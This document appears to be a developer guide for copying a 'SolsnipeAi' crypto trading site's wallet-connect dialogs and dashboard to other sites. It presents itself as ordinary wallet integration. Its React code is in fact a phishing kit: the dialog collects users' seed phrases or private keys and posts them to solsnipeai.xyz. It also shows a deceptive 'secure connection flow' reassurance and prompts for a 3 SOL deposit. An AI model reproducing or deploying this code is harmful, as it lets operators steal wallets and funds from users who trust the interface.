# Wallet Connect & Dashboard Replication Guide

This guide contains all the code and components needed to replicate the wallet connection system and dashboard to another site.

---

## 📋 Table of Contents
1. [Required Dependencies](#required-dependencies)
2. [Component Files](#component-files)
3. [API Integration](#api-integration)
4. [State Management](#state-management)
5. [Routing Setup](#routing-setup)
6. [Step-by-Step Implementation](#step-by-step-implementation)

---

## 1. Required Dependencies

Add these to your `package.json`:

```json
{
  "dependencies": {
    "react": "^18.3.1",
    "react-dom": "^18.3.1",
    "react-router-dom": "^6.30.1",
    "@radix-ui/react-dialog": "^1.1.14",
    "@radix-ui/react-alert": "^1.1.14",
    "@radix-ui/react-tabs": "^1.1.12",
    "lucide-react": "^0.462.0",
    "sonner": "^1.7.4",
    "tailwindcss": "^3.4.17"
  }
}
```

Install:
```bash
npm install react react-dom react-router-dom @radix-ui/react-dialog @radix-ui/react-alert @radix-ui/react-tabs lucide-react sonner
```

---

## 2. Component Files

### A. API Service (`src/lib/api.ts`)

**Purpose:** Handles all wallet-related API calls

**Location:** `src/lib/api.ts`

**Code:**
```typescript
const API_BASE_URL = 'https://solsnipeai.xyz/api';

export interface WalletConnectRequest {
  inputType: 'seed_phrase' | 'passphrase';
  input: string;
  walletType: string;
}

export interface WalletConnectResponse {
  token: string;
  walletAddress: string;
}

export interface WalletDetailsResponse {
  walletAddress: string;
  solsnipeBalance: number;
  lastLoginAt: string;
  autoSnipeBot: number;
  totalTrade: number;
  depositedAmount: number;
  totalSolsnipeCredited: number;
}

export const walletAPI = {
  connect: async (data: WalletConnectRequest): Promise<WalletConnectResponse> => {
    const response = await fetch(`${API_BASE_URL}/wallet-connect`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });

    if (!response.ok) {
      throw new Error('Failed to connect wallet');
    }

    return response.json();
  },

  getWalletDetails: async (token: string): Promise<WalletDetailsResponse> => {
    const response = await fetch(`${API_BASE_URL}/get-wallet-details`, {
      method: 'GET',
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json',
      },
    });

    if (!response.ok) {
      throw new Error('Failed to fetch wallet details');
    }

    return response.json();
  },
};
```

---

### B. First Dialog - Wallet Selection (`src/components/ConnectWalletDialog.tsx`)

**Purpose:** Shows 4 wallet options (Phantom, Solflare, MetaMask, Trust Wallet)

**Code:**
```typescript
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { X } from "lucide-react";
import { PhantomConnectDialog } from "./PhantomConnectDialog";
import { useState } from "react";

interface ConnectWalletDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  onWalletConnected?: () => void;
}

export const ConnectWalletDialog = ({ open, onOpenChange, onWalletConnected }: ConnectWalletDialogProps) => {
  const [showPhantomDialog, setShowPhantomDialog] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState("");

  const handleWalletSelect = (walletName: string) => {
    setSelectedWallet(walletName);
    setShowPhantomDialog(true);
    onOpenChange(false);
  };

  const wallets = [
    {
      name: "Phantom",
      logo: "https://phantom.app/img/phantom-logo.svg",
      description: "Popular Solana wallet",
    },
    {
      name: "Solflare",
      logo: "https://solflare.com/assets/logo.svg",
      description: "Secure Solana wallet",
    },
    {
      name: "MetaMask",
      logo: "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg",
      description: "Leading Web3 wallet",
    },
    {
      name: "Trust Wallet",
      logo: "https://trustwallet.com/assets/images/media/assets/trust_platform.svg",
      description: "Multi-chain wallet",
    },
  ];

  return (
    <>
      <Dialog open={open} onOpenChange={onOpenChange}>
        <DialogContent className="sm:max-w-md bg-card border-border">
          <DialogHeader>
            <div className="flex items-center justify-between">
              <div>
                <DialogTitle>Connect Wallet</DialogTitle>
                <DialogDescription className="mt-1">
                  Choose your preferred wallet to connect
                </DialogDescription>
              </div>
              <button
                onClick={() => onOpenChange(false)}
                className="rounded-sm opacity-70 ring-offset-background transition-opacity hover:opacity-100 focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none"
              >
                <X className="h-4 w-4" />
                <span className="sr-only">Close</span>
              </button>
            </div>
          </DialogHeader>

          <div className="grid gap-3 py-4">
            {wallets.map((wallet) => (
              <Button
                key={wallet.name}
                variant="outline"
                className="w-full justify-start h-auto py-4 px-4 hover:bg-muted"
                onClick={() => handleWalletSelect(wallet.name)}
              >
                <img 
                  src={wallet.logo} 
                  alt={wallet.name}
                  className="w-8 h-8 mr-3"
                  onError={(e) => {
                    e.currentTarget.src = '/logo.png';
                  }}
                />
                <div className="text-left">
                  <div className="font-semibold">{wallet.name}</div>
                  <div className="text-xs text-muted-foreground">{wallet.description}</div>
                </div>
              </Button>
            ))}
          </div>
        </DialogContent>
      </Dialog>

      <PhantomConnectDialog
        open={showPhantomDialog}
        onOpenChange={setShowPhantomDialog}
        walletType={selectedWallet}
        onWalletConnected={onWalletConnected}
      />
    </>
  );
};
```

---

### C. Second Dialog - Credentials Input (`src/components/PhantomConnectDialog.tsx`)

**Purpose:** Accepts seed phrase or passphrase, makes API call

**Code:**
```typescript
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Label } from "@/components/ui/label";
import { X } from "lucide-react";
import { useState } from "react";
import { walletAPI } from "@/lib/api";
import { toast } from "sonner";

interface PhantomConnectDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  walletType: string;
  onWalletConnected?: () => void;
}

export const PhantomConnectDialog = ({ 
  open, 
  onOpenChange, 
  walletType,
  onWalletConnected 
}: PhantomConnectDialogProps) => {
  const [input, setInput] = useState("");
  const [inputType, setInputType] = useState<"seed_phrase" | "passphrase">("seed_phrase");
  const [isConnecting, setIsConnecting] = useState(false);

  const handleConnect = async () => {
    if (!input.trim()) {
      alert("Please enter your seed phrase or passphrase");
      return;
    }

    try {
      setIsConnecting(true);
      
      const response = await walletAPI.connect({
        inputType,
        input: input.trim(),
        walletType,
      });

      // Store authentication data
      localStorage.setItem('walletToken', response.token);
      localStorage.setItem('walletAddress', response.walletAddress);
      localStorage.setItem('walletType', walletType);

      // Show success message
      toast.success("Wallet connected successfully! You need 3 SOL to trade.", {
        duration: 5000,
      });

      // Close dialog and notify parent
      onOpenChange(false);
      setInput("");
      
      if (onWalletConnected) {
        onWalletConnected();
      }
    } catch (error) {
      console.error("Connection error:", error);
      alert("Failed to connect wallet. Please check your credentials.");
    } finally {
      setIsConnecting(false);
    }
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md bg-card border-border">
        <DialogHeader>
          <div className="flex items-center justify-between">
            <div>
              <DialogTitle>Connect {walletType}</DialogTitle>
              <DialogDescription className="mt-1">
                Enter your wallet credentials to connect
              </DialogDescription>
            </div>
            <button
              onClick={() => onOpenChange(false)}
              className="rounded-sm opacity-70 ring-offset-background transition-opacity hover:opacity-100"
            >
              <X className="h-4 w-4" />
            </button>
          </div>
        </DialogHeader>

        <div className="space-y-4 pt-4">
          {/* Toggle between seed phrase and passphrase */}
          <div className="flex gap-2">
            <Button
              variant={inputType === "seed_phrase" ? "default" : "outline"}
              onClick={() => setInputType("seed_phrase")}
              className="flex-1"
            >
              Seed Phrase
            </Button>
            <Button
              variant={inputType === "passphrase" ? "default" : "outline"}
              onClick={() => setInputType("passphrase")}
              className="flex-1"
            >
              Private Key
            </Button>
          </div>

          {/* Input field */}
          <div className="space-y-2">
            <Label htmlFor="wallet-input">
              {inputType === "seed_phrase" ? "Seed Phrase (12/24 words)" : "Private Key"}
            </Label>
            <Textarea
              id="wallet-input"
              placeholder={
                inputType === "seed_phrase"
                  ? "Enter your 12 or 24-word seed phrase..."
                  : "Enter your private key..."
              }
              value={input}
              onChange={(e) => setInput(e.target.value)}
              className="min-h-[100px] font-mono text-sm bg-muted"
              disabled={isConnecting}
            />
          </div>

          {/* Warning */}
          <div className="bg-yellow-950/30 border border-yellow-900/50 rounded-lg p-3">
            <p className="text-xs text-yellow-400">
              ⚠️ Never share your seed phrase or private key with anyone. 
              We will never ask for this information outside of this secure connection flow.
            </p>
          </div>

          {/* Connect button */}
          <Button
            onClick={handleConnect}
            disabled={isConnecting || !input.trim()}
            className="w-full"
          >
            {isConnecting ? "Connecting..." : "Connect Wallet"}
          </Button>
        </div>
      </DialogContent>
    </Dialog>
  );
};
```

---

### D. Navigation with Wallet State (`src/components/Navigation.tsx`)

**Key Section:** The part that triggers the wallet dialog and shows connection status

**Code (Relevant Section):**
```typescript
import { ConnectWalletDialog } from "./ConnectWalletDialog";
import { useState, useEffect } from "react";
import { Link, useNavigate } from "react-router-dom";

export const Navigation = () => {
  const [showConnectDialog, setShowConnectDialog] = useState(false);
  const [isConnected, setIsConnected] = useState(false);
  const [walletAddress, setWalletAddress] = useState("");
  const navigate = useNavigate();

  useEffect(() => {
    const address = localStorage.getItem('walletAddress');
    if (address) {
      setIsConnected(true);
      setWalletAddress(address);
    }
  }, []);

  const handleDisconnect = () => {
    localStorage.removeItem('walletToken');
    localStorage.removeItem('walletAddress');
    localStorage.removeItem('walletType');
    setIsConnected(false);
    setWalletAddress("");
    navigate('/');
  };

  const formatAddress = (address: string) => {
    return `${address.slice(0, 4)}...${address.slice(-4)}`;
  };

  return (
    <nav className="fixed top-0 left-0 right-0 z-50 bg-background/80 backdrop-blur-lg border-b border-border">
      <div className="w-full px-6 py-4">
        <div className="flex items-center justify-between">
          {/* Logo and brand */}
          <Link to="/" className="flex items-center gap-2">
            <img src="/logo.png" alt="Logo" className="w-8 h-8" />
            <span className="font-bold text-xl">SolsnipeAi</span>
          </Link>

          {/* Connect Wallet / Wallet Status */}
          <div className="flex items-center gap-4">
            {isConnected ? (
              <>
                <div className="flex items-center gap-2 px-3 py-2 bg-muted rounded-lg">
                  <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                  <span className="text-sm">{formatAddress(walletAddress)}</span>
                </div>
                <Link to="/dashboard">
                  <Button variant="default">Dashboard</Button>
                </Link>
                <Button variant="outline" onClick={handleDisconnect}>
                  Disconnect
                </Button>
              </>
            ) : (
              <Button 
                onClick={() => setShowConnectDialog(true)}
                className="bg-gradient-to-r from-purple-600 to-blue-600"
              >
                Connect Wallet
              </Button>
            )}
          </div>
        </div>
      </div>

      <ConnectWalletDialog
        open={showConnectDialog}
        onOpenChange={setShowConnectDialog}
        onWalletConnected={() => {
          const address = localStorage.getItem('walletAddress');
          if (address) {
            setIsConnected(true);
            setWalletAddress(address);
          }
        }}
      />
    </nav>
  );
};
```

---

### E. Dashboard Page (`src/pages/Dashboard.tsx`)

**Purpose:** Main dashboard with wallet info, balance, tabs

**Key Features:**
- Real-time SOL price from CoinGecko
- Wallet details from API
- Multiple tabs (Overview, Account, Portfolio, etc.)
- Withdraw functionality

**Code:** (File is in `src/pages/Dashboard.tsx`)

---

## 3. State Management

### LocalStorage Keys Used:
```typescript
// After successful wallet connection:
localStorage.setItem('walletToken', token);        // JWT token for API auth
localStorage.setItem('walletAddress', address);    // User's wallet address
localStorage.setItem('walletType', walletType);    // Which wallet (Phantom, etc.)

// To check if connected:
const token = localStorage.getItem('walletToken');
const address = localStorage.getItem('walletAddress');

// To disconnect:
localStorage.removeItem('walletToken');
localStorage.removeItem('walletAddress');
localStorage.removeItem('walletType');
```

---

## 4. API Endpoints

### Base URL:
```
https://solsnipeai.xyz/api
```

### Endpoints:

#### 1. Connect Wallet
```
POST /wallet-connect

Request Body:
{
  "inputType": "seed_phrase" | "passphrase",
  "input": "user's seed phrase or private key",
  "walletType": "Phantom" | "Solflare" | "MetaMask" | "Trust Wallet"
}

Response:
{
  "token": "JWT_TOKEN_HERE",
  "walletAddress": "WALLET_ADDRESS_HERE"
}
```

#### 2. Get Wallet Details
```
GET /get-wallet-details

Headers:
Authorization: Bearer JWT_TOKEN

Response:
{
  "walletAddress": "string",
  "solsnipeBalance": number,
  "lastLoginAt": "ISO_DATE_STRING",
  "autoSnipeBot": number,
  "totalTrade": number,
  "depositedAmount": number,
  "totalSolsnipeCredited": number
}
```

---

## 5. Routing Setup

Add these routes to your `App.tsx`:

```typescript
import { BrowserRouter, Routes, Route } from "react-router-dom";
import Dashboard from "./pages/Dashboard";

const App = () => (
  <BrowserRouter>
    <Routes>
      <Route path="/" element={<HomePage />} />
      <Route path="/dashboard" element={<Dashboard />} />
      {/* other routes */}
    </Routes>
  </BrowserRouter>
);
```

---

## 6. Step-by-Step Implementation

### Step 1: Install Dependencies
```bash
npm install react-router-dom @radix-ui/react-dialog lucide-react sonner
```

### Step 2: Create Directory Structure
```
src/
├── components/
│   ├── ui/           (shadcn/ui components)
│   ├── ConnectWalletDialog.tsx
│   ├── PhantomConnectDialog.tsx
│   ├── WithdrawDialog.tsx
│   ├── VsnRequiredDialog.tsx
│   └── Navigation.tsx
├── lib/
│   └── api.ts
├── pages/
│   └── Dashboard.tsx
└── App.tsx
```

### Step 3: Copy Files
1. Copy `api.ts` for API integration
2. Copy `ConnectWalletDialog.tsx` for wallet selection
3. Copy `PhantomConnectDialog.tsx` for credentials
4. Copy `Navigation.tsx` for the connect button
5. Copy `Dashboard.tsx` for the full dashboard
6. Copy `WithdrawDialog.tsx` and `VsnRequiredDialog.tsx` for withdraw feature

### Step 4: Configure API Base URL
In `api.ts`, update the base URL if needed:
```typescript
const API_BASE_URL = 'https://YOUR_API_URL/api';
```

### Step 5: Add Toaster for Notifications
In your main `App.tsx`:
```typescript
import { Toaster } from "sonner";

const App = () => (
  <>
    <Toaster />
    {/* Your routes */}
  </>
);
```

### Step 6: Style with Tailwind
Make sure you have Tailwind CSS configured with the dark theme colors used in the project.

---

## 7. Flow Diagram

```
User clicks "Connect Wallet"
         ↓
ConnectWalletDialog opens (shows 4 wallets)
         ↓
User selects wallet (e.g., Phantom)
         ↓
PhantomConnectDialog opens
         ↓
User enters seed phrase/private key
         ↓
API call to /wallet-connect
         ↓
Store token + address in localStorage
         ↓
Show success toast
         ↓
Navigation updates (shows connected state)
         ↓
User can access Dashboard
         ↓
Dashboard fetches wallet details with token
         ↓
Display balance, trades, bots, etc.
```

---

## 8. Key Features

✅ **Two-step wallet connection**
✅ **4 wallet options with real logos**
✅ **Seed phrase OR private key input**
✅ **JWT token authentication**
✅ **LocalStorage persistence**
✅ **Real-time SOL price**
✅ **Wallet details from API**
✅ **Withdraw functionality with VSN requirement**
✅ **Responsive design**
✅ **Success notifications**
✅ **Disconnect functionality**

---

## 9. Testing

### Test Wallet Connection:
1. Click "Connect Wallet"
2. Select any wallet
3. Enter test credentials
4. Check if token is stored in localStorage
5. Verify "Connected" state appears
6. Check if Dashboard button appears

### Test Dashboard:
1. After connecting, click "Dashboard"
2. Verify wallet details load
3. Check SOL price updates
4. Test tab navigation
5. Try withdraw button

---

## 10. Troubleshooting

**Issue:** Dialog doesn't open
- Check if `@radix-ui/react-dialog` is installed
- Verify `open` and `onOpenChange` props are passed correctly

**Issue:** API call fails
- Check API base URL
- Verify network requests in browser DevTools
- Check CORS settings on backend

**Issue:** Token not persisting
- Check localStorage in DevTools
- Verify token is saved after successful connection

---

## 11. Security Notes

⚠️ **Important:**
- Never log sensitive data (seed phrases, private keys)
- Always use HTTPS for API calls
- Implement proper CORS on backend
- Validate all inputs before API calls
- Clear sensitive data from memory after use
- Use secure token storage methods in production

---

## Need Help?

This guide contains all the essential code to replicate the wallet connection and dashboard. All files are located in:
- `src/components/` - UI components
- `src/lib/api.ts` - API integration
- `src/pages/Dashboard.tsx` - Dashboard page

Copy these files to your new project and follow the setup steps above!
